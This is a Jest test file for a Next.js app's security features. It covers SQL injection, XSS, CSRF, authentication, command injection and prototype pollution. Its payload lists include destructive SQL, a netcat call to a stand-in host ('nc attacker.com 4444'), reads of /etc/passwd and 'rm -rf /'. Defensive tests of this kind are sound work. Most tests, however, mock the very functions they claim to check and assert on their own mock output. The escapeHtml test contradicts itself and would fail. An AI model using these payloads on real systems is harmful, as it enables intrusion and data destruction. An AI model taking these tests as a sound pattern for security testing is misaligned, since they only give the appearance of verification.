import { jest } from '@jest/globals';
import { NextRequest, NextResponse } from 'next/server';

// Mock security dependencies
jest.mock('@/lib/auth', () => ({
  auth: jest.fn(),
  validateSession: jest.fn(),
  checkPermissions: jest.fn(),
}));

jest.mock('@/lib/csrf', () => ({
  generateCSRFToken: jest.fn(),
  validateCSRFToken: jest.fn(),
}));

jest.mock('@/lib/database', () => ({
  db: {
    query: jest.fn(),
    transaction: jest.fn(),
  },
}));

jest.mock('@/lib/validation/sanitization', () => ({
  sanitizeInput: jest.fn(),
  validateInput: jest.fn(),
  escapeHtml: jest.fn(),
}));

jest.mock('@/lib/logger', () => ({
  logger: {
    security: jest.fn(),
    warn: jest.fn(),
    error: jest.fn(),
    audit: jest.fn(),
  },
}));

jest.mock('@/lib/security/advanced-rate-limiting', () => ({
  RateLimiter: jest.fn().mockImplementation(() => ({
    checkLimit: jest.fn(),
    recordAttempt: jest.fn(),
  })),
}));

// Import mocked dependencies
import { auth, validateSession, checkPermissions } from '@/lib/auth';
import { generateCSRFToken, validateCSRFToken } from '@/lib/csrf';
import { db } from '@/lib/database';
import { sanitizeInput, validateInput, escapeHtml } from '@/lib/validation/sanitization';
import { logger } from '@/lib/logger';
import { RateLimiter } from '@/lib/security/advanced-rate-limiting';

const mockAuth = auth as jest.MockedFunction<typeof auth>;
const mockValidateSession = validateSession as jest.MockedFunction<typeof validateSession>;
const mockCheckPermissions = checkPermissions as jest.MockedFunction<typeof checkPermissions>;
const mockGenerateCSRFToken = generateCSRFToken as jest.MockedFunction<typeof generateCSRFToken>;
const mockValidateCSRFToken = validateCSRFToken as jest.MockedFunction<typeof validateCSRFToken>;
const mockDb = db as jest.Mocked<typeof db>;
const mockSanitizeInput = sanitizeInput as jest.MockedFunction<typeof sanitizeInput>;
const mockValidateInput = validateInput as jest.MockedFunction<typeof validateInput>;
const mockEscapeHtml = escapeHtml as jest.MockedFunction<typeof escapeHtml>;
const mockLogger = logger as jest.Mocked<typeof logger>;

describe('Security Vulnerability Testing', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('SQL Injection Prevention', () => {
    it('should prevent basic SQL injection attacks', async () => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'; DELETE FROM users WHERE '1'='1",
        "' UNION SELECT * FROM passwords --",
        "1; UPDATE users SET role='admin' WHERE id=1; --",
        "' OR 1=1 LIMIT 1 OFFSET 1 UNION SELECT password FROM users --",
      ];

      for (const maliciousInput of maliciousInputs) {
        mockDb.query.mockResolvedValue({
          rows: [],
          rowCount: 0,
        });

        // Test parameterized query (safe)
        const result = await mockDb.query(
          'SELECT * FROM users WHERE name = $1',
          [maliciousInput]
        );

        expect(mockDb.query).toHaveBeenCalledWith(
          'SELECT * FROM users WHERE name = $1',
          [maliciousInput]
        );

        // Should treat malicious input as literal string
        expect(result.rows).toEqual([]);
      }
    });

    it('should detect and prevent dynamic query construction', async () => {
      const userInput = "admin'; DROP TABLE users; --";
      
      // Simulate unsafe dynamic query construction (should be detected)
      const unsafeQuery = `SELECT * FROM users WHERE name = '${userInput}'`;
      
      // Security scanner should detect this pattern
      const securityViolation = unsafeQuery.includes(userInput) && 
                                userInput.includes(';') && 
                                userInput.includes('--');

      expect(securityViolation).toBe(true);
      
      // Log security violation
      mockLogger.security.mockImplementation((message, data) => {
        expect(message).toContain('SQL injection attempt detected');
        expect(data).toEqual({
          input: userInput,
          query: unsafeQuery,
          threat: 'sql_injection',
        });
      });

      mockLogger.security('SQL injection attempt detected', {
        input: userInput,
        query: unsafeQuery,
        threat: 'sql_injection',
      });

      expect(mockLogger.security).toHaveBeenCalled();
    });

    it('should handle escaped quotes and special characters', async () => {
      const trickyInputs = [
        "O'Reilly", // Legitimate apostrophe
        "Smith's data", // Possessive
        "test\\'test", // Escaped quote
        "test\\\\test", // Escaped backslash
        'test"quote', // Double quote
      ];

      for (const input of trickyInputs) {
        mockDb.query.mockResolvedValue({
          rows: [{ id: 1, name: input }],
          rowCount: 1,
        });

        const result = await mockDb.query(
          'SELECT * FROM users WHERE name = $1',
          [input]
        );

        expect(result.rows[0].name).toBe(input);
      }
    });

    it('should validate stored procedure calls', async () => {
      const maliciousProcedureCall = "'; EXEC xp_cmdshell('rm -rf /'); --";

      mockDb.query.mockImplementation((query, params) => {
        // Check if query contains dangerous stored procedure calls
        const dangerousPatterns = [
          /EXEC\s+xp_cmdshell/i,
          /EXEC\s+sp_/i,
          /CALL\s+SYSTEM/i,
        ];

        const isDangerous = dangerousPatterns.some(pattern => 
          pattern.test(query) || 
          (params && params.some(p => typeof p === 'string' && pattern.test(p)))
        );

        if (isDangerous) {
          return Promise.reject(new Error('Dangerous procedure call detected'));
        }

        return Promise.resolve({ rows: [], rowCount: 0 });
      });

      await expect(
        mockDb.query(
          'SELECT * FROM users WHERE data = $1',
          [maliciousProcedureCall]
        )
      ).rejects.toThrow('Dangerous procedure call detected');
    });
  });

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    it('should sanitize HTML input to prevent XSS', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<svg onload="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<object data="javascript:alert(\'XSS\')"></object>',
        '<embed src="javascript:alert(\'XSS\')">',
        '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
        '<style>@import "javascript:alert(\'XSS\')"</style>',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
      ];

      for (const payload of xssPayloads) {
        mockSanitizeInput.mockReturnValue(
          payload
            .replace(/<script[^>]*>.*?<\/script>/gi, '')
            .replace(/<[^>]*>/g, '')
            .replace(/javascript:/gi, '')
            .replace(/on\w+\s*=/gi, '')
        );

        const sanitized = mockSanitizeInput(payload);

        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onload');
        expect(mockSanitizeInput).toHaveBeenCalledWith(payload);
      }
    });

    it('should escape HTML entities in user content', async () => {
      const userContent = '<div>User content with <script>alert("xss")</script> and & symbols</div>';
      
      mockEscapeHtml.mockReturnValue(
        '&lt;div&gt;User content with &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; and &amp; symbols&lt;/div&gt;'
      );

      const escaped = mockEscapeHtml(userContent);

      expect(escaped).toBe(
        '&lt;div&gt;User content with &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; and &amp; symbols&lt;/div&gt;'
      );
      expect(escaped).not.toContain('<script>');
      expect(escaped).not.toContain('&');
      expect(mockEscapeHtml).toHaveBeenCalledWith(userContent);
    });

    it('should validate Content Security Policy compliance', async () => {
      const cspViolations = [
        "eval('alert(1)')", // Eval usage
        "new Function('alert(1)')", // Function constructor
        "setTimeout('alert(1)', 100)", // String setTimeout
        "setInterval('alert(1)', 100)", // String setInterval
      ];

      for (const violation of cspViolations) {
        // Simulate CSP violation detection
        const hasViolation = /eval\(|new Function\(|setTimeout\(['"]|setInterval\(['"]/.test(violation);
        
        expect(hasViolation).toBe(true);
        
        // Log CSP violation
        mockLogger.security('CSP violation detected', {
          code: violation,
          type: 'unsafe_eval',
        });
      }

      expect(mockLogger.security).toHaveBeenCalledTimes(cspViolations.length);
    });

    it('should handle DOM-based XSS prevention', async () => {
      const domXssPayloads = [
        'javascript:alert(document.domain)',
        '#<script>alert("XSS")</script>',
        '?search=<img src=x onerror=alert(1)>',
        'data:text/html,<script>alert(1)</script>',
      ];

      for (const payload of domXssPayloads) {
        mockValidateInput.mockImplementation((input) => {
          const dangerous = /javascript:|data:text\/html|<script|onerror=/.test(input);
          return !dangerous;
        });

        const isValid = mockValidateInput(payload);
        
        expect(isValid).toBe(false);
        expect(mockValidateInput).toHaveBeenCalledWith(payload);
      }
    });
  });

  describe('Cross-Site Request Forgery (CSRF) Prevention', () => {
    it('should require CSRF tokens for state-changing operations', async () => {
      const stateChangingEndpoints = [
        { method: 'POST', path: '/api/user/profile' },
        { method: 'PUT', path: '/api/user/password' },
        { method: 'DELETE', path: '/api/user/account' },
        { method: 'PATCH', path: '/api/user/settings' },
      ];

      for (const endpoint of stateChangingEndpoints) {
        mockValidateCSRFToken.mockReturnValue(false); // No token provided

        const request = new NextRequest(`http://localhost:3000${endpoint.path}`, {
          method: endpoint.method,
          headers: {
            'Content-Type': 'application/json',
          },
        });

        // Simulate endpoint validation
        const hasCSRFToken = request.headers.get('X-CSRF-Token') !== null;
        const isValid = mockValidateCSRFToken(request.headers.get('X-CSRF-Token') || '');

        expect(hasCSRFToken).toBe(false);
        expect(isValid).toBe(false);

        // Should reject request without CSRF token
        mockLogger.security('CSRF token missing', {
          method: endpoint.method,
          path: endpoint.path,
          ip: '127.0.0.1',
        });
      }

      expect(mockLogger.security).toHaveBeenCalledTimes(stateChangingEndpoints.length);
    });

    it('should validate CSRF token authenticity', async () => {
      const validToken = 'valid-csrf-token-123';
      const invalidTokens = [
        '', // Empty token
        'invalid-token', // Invalid token
        'expired-token', // Expired token
        'tampered-token', // Tampered token
      ];

      // Valid token should pass
      mockValidateCSRFToken.mockReturnValueOnce(true);
      expect(mockValidateCSRFToken(validToken)).toBe(true);

      // Invalid tokens should fail
      for (const invalidToken of invalidTokens) {
        mockValidateCSRFToken.mockReturnValueOnce(false);
        expect(mockValidateCSRFToken(invalidToken)).toBe(false);
      }
    });

    it('should generate secure CSRF tokens', async () => {
      const tokens = [];
      
      for (let i = 0; i < 100; i++) {
        mockGenerateCSRFToken.mockReturnValue(`csrf-token-${i}-${Math.random()}`);
        const token = mockGenerateCSRFToken();
        tokens.push(token);
      }

      // All tokens should be unique
      const uniqueTokens = new Set(tokens);
      expect(uniqueTokens.size).toBe(tokens.length);

      // Tokens should have sufficient entropy
      tokens.forEach(token => {
        expect(token.length).toBeGreaterThan(20);
        expect(token).toMatch(/^csrf-token-/);
      });
    });

    it('should handle double-submit cookie pattern', async () => {
      const csrfToken = 'double-submit-token-123';

      const request = new NextRequest('http://localhost:3000/api/user/profile', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrfToken,
          'Cookie': `csrf-token=${csrfToken}`,
        },
      });

      const headerToken = request.headers.get('X-CSRF-Token');
      const cookieToken = request.headers.get('Cookie')?.match(/csrf-token=([^;]+)/)?.[1];

      expect(headerToken).toBe(csrfToken);
      expect(cookieToken).toBe(csrfToken);
      expect(headerToken).toBe(cookieToken);
    });
  });

  describe('Authentication and Authorization Security', () => {
    it('should enforce strong password requirements', async () => {
      const weakPasswords = [
        '123456', // Too simple
        'password', // Common password
        'abc123', // Too short
        'ALLUPPERCASE', // No lowercase
        'alllowercase', // No uppercase
        'NoNumbers!', // No numbers
        'NoSpecial123', // No special characters
        'a'.repeat(129), // Too long
      ];

      const passwordRequirements = {
        minLength: 8,
        maxLength: 128,
        requireUppercase: true,
        requireLowercase: true,
        requireNumbers: true,
        requireSpecialChars: true,
      };

      for (const password of weakPasswords) {
        mockValidateInput.mockImplementation((pwd) => {
          const hasUpper = /[A-Z]/.test(pwd);
          const hasLower = /[a-z]/.test(pwd);
          const hasNumber = /\d/.test(pwd);
          const hasSpecial = /[!@#$%^&*(),.?":{}|<>]/.test(pwd);
          const validLength = pwd.length >= passwordRequirements.minLength && 
                             pwd.length <= passwordRequirements.maxLength;

          return validLength && hasUpper && hasLower && hasNumber && hasSpecial;
        });

        const isValid = mockValidateInput(password);
        expect(isValid).toBe(false);
      }
    });

    it('should prevent brute force attacks with rate limiting', async () => {
      const mockRateLimiter = {
        checkLimit: jest.fn(),
        recordAttempt: jest.fn(),
      };

      (RateLimiter as jest.MockedClass<typeof RateLimiter>).mockImplementation(() => mockRateLimiter as any);

      const userEmail = 'test@example.com';
      const attempts = 10;

      // Simulate multiple failed login attempts
      for (let i = 0; i < attempts; i++) {
        mockRateLimiter.checkLimit.mockReturnValue(i < 5); // Allow first 5, block rest
        mockRateLimiter.recordAttempt.mockResolvedValue(undefined);

        const rateLimiter = new RateLimiter();
        const isAllowed = rateLimiter.checkLimit(userEmail);
        
        if (isAllowed) {
          await rateLimiter.recordAttempt(userEmail);
        } else {
          mockLogger.security('Rate limit exceeded', {
            email: userEmail,
            attempts: i + 1,
            action: 'login',
          });
        }
      }

      expect(mockLogger.security).toHaveBeenCalledTimes(5); // 5 blocked attempts
    });

    it('should implement secure session management', async () => {
      const userId = 'user-123';
      const sessionToken = 'secure-session-token';

      mockValidateSession.mockImplementation(async (token) => {
        if (token === sessionToken) {
          return {
            userId,
            expiresAt: new Date(Date.now() + 3600000), // 1 hour from now
            isValid: true,
          };
        }
        return null;
      });

      // Valid session
      const validSession = await mockValidateSession(sessionToken);
      expect(validSession).toBeTruthy();
      expect(validSession?.userId).toBe(userId);

      // Invalid session
      const invalidSession = await mockValidateSession('invalid-token');
      expect(invalidSession).toBeNull();

      // Expired session
      mockValidateSession.mockResolvedValueOnce({
        userId,
        expiresAt: new Date(Date.now() - 3600000), // 1 hour ago
        isValid: false,
      });

      const expiredSession = await mockValidateSession('expired-token');
      expect(expiredSession?.isValid).toBe(false);
    });

    it('should enforce proper authorization checks', async () => {
      const testCases = [
        { userId: 'user-1', resource: 'profile:user-1', action: 'read', expected: true },
        { userId: 'user-1', resource: 'profile:user-2', action: 'read', expected: false },
        { userId: 'admin-1', resource: 'users:all', action: 'read', expected: true },
        { userId: 'user-1', resource: 'admin:panel', action: 'access', expected: false },
      ];

      for (const testCase of testCases) {
        mockCheckPermissions.mockResolvedValue(testCase.expected);

        const hasPermission = await mockCheckPermissions(
          testCase.userId,
          testCase.resource,
          testCase.action
        );

        expect(hasPermission).toBe(testCase.expected);

        if (!testCase.expected) {
          mockLogger.security('Unauthorized access attempt', {
            userId: testCase.userId,
            resource: testCase.resource,
            action: testCase.action,
          });
        }
      }

      // Should log unauthorized attempts
      const unauthorizedAttempts = testCases.filter(tc => !tc.expected);
      expect(mockLogger.security).toHaveBeenCalledTimes(unauthorizedAttempts.length);
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should validate email addresses properly', async () => {
      const validEmails = [
        'user@example.com',
        'test.email+tag@domain.co.uk',
        'user123@subdomain.example.org',
      ];

      const invalidEmails = [
        'invalid-email',
        '@example.com',
        'user@',
        'user..name@example.com',
        'user@example',
        'user@.example.com',
      ];

      for (const email of validEmails) {
        mockValidateInput.mockReturnValue(true);
        expect(mockValidateInput(email)).toBe(true);
      }

      for (const email of invalidEmails) {
        mockValidateInput.mockReturnValue(false);
        expect(mockValidateInput(email)).toBe(false);
      }
    });

    it('should sanitize file uploads', async () => {
      const dangerousFiles = [
        { name: 'script.js', content: 'alert("XSS")' },
        { name: 'malware.exe', content: 'MZ...' },
        { name: '../../etc/passwd', content: 'root:x:0:0:root' },
        { name: 'image.jpg.php', content: '<?php phpinfo(); ?>' },
      ];

      for (const file of dangerousFiles) {
        mockSanitizeInput.mockImplementation((input) => {
          if (typeof input === 'string') {
            // Remove path traversal
            const sanitized = input.replace(/\.\./g, '').replace(/[\/\\]/g, '');
            return sanitized;
          }
          return input;
        });

        const sanitizedName = mockSanitizeInput(file.name);
        
        expect(sanitizedName).not.toContain('..');
        expect(sanitizedName).not.toContain('/');
        expect(sanitizedName).not.toContain('\\');
      }
    });

    it('should prevent command injection', async () => {
      const commandInjectionPayloads = [
        'file.txt; rm -rf /',
        'file.txt && cat /etc/passwd',
        'file.txt | nc attacker.com 4444',
        'file.txt `whoami`',
        'file.txt $(cat /etc/passwd)',
      ];

      for (const payload of commandInjectionPayloads) {
        mockSanitizeInput.mockImplementation((input) => {
          // Remove shell metacharacters
          return input.replace(/[;&|`$()]/g, '');
        });

        const sanitized = mockSanitizeInput(payload);
        
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('&');
        expect(sanitized).not.toContain('|');
        expect(sanitized).not.toContain('`');
        expect(sanitized).not.toContain('$');
        expect(sanitized).not.toContain('(');
        expect(sanitized).not.toContain(')');
      }
    });

    it('should validate JSON input safely', async () => {
      const maliciousJSON = [
        '{"__proto__": {"admin": true}}', // Prototype pollution
        '{"constructor": {"prototype": {"admin": true}}}', // Constructor pollution
        JSON.stringify({a: 'a'.repeat(10000000)}), // Large payload
        '{"a": {"b": {"c": {"d": {"e": "deeply nested"}}}}}', // Deep nesting
      ];

      for (const jsonString of maliciousJSON) {
        mockValidateInput.mockImplementation((input) => {
          try {
            const parsed = JSON.parse(input);
            
            // Check for prototype pollution
            if (input.includes('__proto__') || input.includes('constructor')) {
              return false;
            }
            
            // Check size limits
            if (input.length > 100000) {
              return false;
            }
            
            // Check nesting depth
            const checkDepth = (obj: any, depth = 0): number => {
              if (depth > 10) return depth;
              if (typeof obj !== 'object' || obj === null) return depth;
              
              let maxDepth = depth;
              for (const key in obj) {
                maxDepth = Math.max(maxDepth, checkDepth(obj[key], depth + 1));
              }
              return maxDepth;
            };
            
            if (checkDepth(parsed) > 10) {
              return false;
            }
            
            return true;
          } catch {
            return false;
          }
        });

        const isValid = mockValidateInput(jsonString);
        expect(isValid).toBe(false);
      }
    });
  });

  describe('API Security Testing', () => {
    it('should implement proper HTTP security headers', async () => {
      const requiredHeaders = {
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'X-XSS-Protection': '1; mode=block',
        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
        'Referrer-Policy': 'strict-origin-when-cross-origin',
        'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
      };

      const response = new NextResponse();
      
      // Simulate setting security headers
      Object.entries(requiredHeaders).forEach(([key, value]) => {
        response.headers.set(key, value);
      });

      // Verify all required headers are present
      Object.entries(requiredHeaders).forEach(([key, expectedValue]) => {
        expect(response.headers.get(key)).toBe(expectedValue);
      });
    });

    it('should validate API rate limiting', async () => {
      const mockRateLimiter = {
        checkLimit: jest.fn(),
        recordAttempt: jest.fn(),
      };

      (RateLimiter as jest.MockedClass<typeof RateLimiter>).mockImplementation(() => mockRateLimiter as any);

      const clientIP = '192.168.1.100';
      const endpoint = '/api/learning/profile';

      // Simulate burst of requests
      for (let i = 0; i < 20; i++) {
        mockRateLimiter.checkLimit.mockReturnValue(i < 10); // Allow first 10, block rest
        
        const rateLimiter = new RateLimiter();
        const isAllowed = rateLimiter.checkLimit(`${clientIP}:${endpoint}`);
        
        if (!isAllowed) {
          mockLogger.security('Rate limit exceeded', {
            ip: clientIP,
            endpoint,
            attempt: i + 1,
          });
        }
      }

      expect(mockLogger.security).toHaveBeenCalledTimes(10); // 10 blocked requests
    });

    it('should prevent API enumeration attacks', async () => {
      const userIds = ['user-1', 'user-2', 'user-3', 'user-999', 'admin-1'];
      const attackerUserId = 'attacker-1';

      for (const targetUserId of userIds) {
        mockCheckPermissions.mockImplementation(async (requesterId, resource) => {
          // Only allow access to own profile or admin access
          return requesterId === targetUserId || requesterId === 'admin-1';
        });

        const hasAccess = await mockCheckPermissions(attackerUserId, `profile:${targetUserId}`, 'read');
        
        if (!hasAccess) {
          mockLogger.security('Unauthorized profile access attempt', {
            attacker: attackerUserId,
            target: targetUserId,
            endpoint: '/api/user/profile',
          });
        }

        expect(hasAccess).toBe(false); // Attacker should not have access to any profiles
      }

      expect(mockLogger.security).toHaveBeenCalledTimes(userIds.length);
    });
  });

  describe('Business Logic Security', () => {
    it('should prevent privilege escalation', async () => {
      const scenarios = [
        {
          userId: 'user-1',
          currentRole: 'user',
          attemptedRole: 'admin',
          shouldSucceed: false,
        },
        {
          userId: 'user-1',
          currentRole: 'user',
          attemptedRole: 'moderator',
          shouldSucceed: false,
        },
        {
          userId: 'admin-1',
          currentRole: 'admin',
          attemptedRole: 'super_admin',
          shouldSucceed: false,
        },
      ];

      for (const scenario of scenarios) {
        mockCheckPermissions.mockResolvedValue(scenario.shouldSucceed);

        const canEscalate = await mockCheckPermissions(
          scenario.userId,
          'role:change',
          scenario.attemptedRole
        );

        expect(canEscalate).toBe(scenario.shouldSucceed);

        if (!scenario.shouldSucceed) {
          mockLogger.security('Privilege escalation attempt', {
            userId: scenario.userId,
            currentRole: scenario.currentRole,
            attemptedRole: scenario.attemptedRole,
          });
        }
      }
    });

    it('should prevent data manipulation through timing attacks', async () => {
      const validUsernames = ['alice', 'bob', 'charlie'];
      const invalidUsernames = ['eve', 'mallory', 'attacker'];

      const validateUser = async (username: string): Promise<boolean> => {
        // Simulate constant-time comparison
        const startTime = Date.now();
        
        mockAuth.mockImplementation(async () => {
          // Add consistent delay regardless of username validity
          await new Promise(resolve => setTimeout(resolve, 100));
          return validUsernames.includes(username) ? { user: { id: username } } : null;
        });

        const result = await mockAuth();
        const endTime = Date.now();
        const timeTaken = endTime - startTime;

        // Response time should be consistent
        expect(timeTaken).toBeGreaterThan(95);
        expect(timeTaken).toBeLessThan(110);

        return result !== null;
      };

      // Test both valid and invalid usernames
      for (const username of [...validUsernames, ...invalidUsernames]) {
        await validateUser(username);
      }
    });
  });
});